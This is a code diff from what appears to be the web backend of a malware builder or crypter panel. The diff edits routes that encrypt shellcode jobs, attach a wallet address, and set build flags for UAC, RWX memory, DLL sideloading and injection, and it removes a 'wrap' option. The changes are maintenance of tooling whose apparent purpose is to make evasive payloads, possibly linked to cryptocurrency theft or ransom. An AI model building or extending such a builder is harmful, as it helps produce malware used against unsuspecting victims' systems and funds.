@@ -290,7 +290,7 @@ def _save_build_history(
         "uac":            bool(data.get("uac")),
         "rwx":            bool(data.get("rwx")),
         "debug":          bool(data.get("debug")),
-        "inject":         inject,
+        "inject":         bool(data.get("inject")) and mode == "sideload",
         "zip_name":       zip_info.get("name") if zip_info else None,
         "zip_size":       zip_info.get("size", 0) if zip_info else 0,
         "sideload_h_size": sideload_h_size,
@@ -379,13 +379,9 @@ def api_encrypt():
         if wmeta:
             wallet_address = wmeta.get("address", "")
 
-    wrap = request.form.get("wrap") == "1"
-
     argv = [sys.executable, "Encrypt.py", str(sc_path)]
     if wallet_address and _ARW_ADDR_RE.match(wallet_address):
         argv += ["--wallet", wallet_address]
-    if wrap:
-        argv += ["--wrap"]
 
     result = _run(argv)
 
@@ -411,7 +407,6 @@ def api_encrypt():
         "shellcode_job_id":    shellcode_job_id,
         "donut_label":         donut_label,
         "donut_original_name": donut_original_name,
-        "wrapped":             wrap,
         "dat_name":            dat_name,
         "dat_size":            0,
         "payload_h_size":      0,
@@ -981,7 +976,6 @@ def api_profiles_encrypt_create():
         "name":             (data.get("name") or "Unnamed").strip(),
         "shellcode_job_id": data.get("shellcode_job_id", ""),
         "wallet_id":        data.get("wallet_id", ""),
-        "wrap":             bool(data.get("wrap")),
         "created_at":       int(time.time()),
     }
     profiles = _load_profiles()
@@ -1039,7 +1033,6 @@ def api_profiles_update(pid):
         update.update({
             "shellcode_job_id": data.get("shellcode_job_id", existing.get("shellcode_job_id", "")),
             "wallet_id":        data.get("wallet_id",        existing.get("wallet_id", "")),
-            "wrap":             bool(data.get("wrap")),
         })
     else:
         update.update({
